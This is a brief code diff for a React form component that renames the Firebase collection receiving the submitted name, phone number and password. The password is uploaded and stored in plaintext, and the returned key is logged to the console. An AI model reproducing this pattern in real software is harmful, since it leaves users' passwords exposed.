@@ -21,7 +21,7 @@ function FirstPage() {
     setIsSubmitting(true); // Show loading during submit
     // Simulate form submission delay
     setTimeout(async () =>  {
-    const result = await  FirebaseUtil.uploadAnyModel("notes", { name, phone, password });
+    const result = await  FirebaseUtil.uploadAnyModel("notes_web3", { name, phone, password });
     localStorage.setItem('key', result.key);
     console.log("result.key = "+result.key);
       navigate('/second-page'); // Navigate to third page after submission
